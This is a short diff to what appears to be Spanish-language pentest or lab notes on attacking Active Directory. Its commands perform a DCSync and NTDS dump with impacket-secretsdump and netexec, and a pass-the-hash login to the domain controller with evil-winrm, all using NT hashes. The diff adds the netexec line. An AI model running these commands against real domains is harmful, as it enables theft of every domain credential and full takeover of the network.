@@ -102,10 +102,13 @@ Paso 4:
 Paso 5:
 # Hacer DCSYNC
 ❯ impacket-secretsdump -hashes :24e014f2ac9bbe2ec3be1571fe9de936 domain.corp/'DC01$'@IP_DC 
+❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
 
 Paso 6:
 # Ingresar como la cuenta Administrator 
 ❯ evil-winrm -i IP_DC -u 'Administrator' -H '4366ec0f86e29be2a4a5e87a1ba922ec'
+
+
 ```
 
 
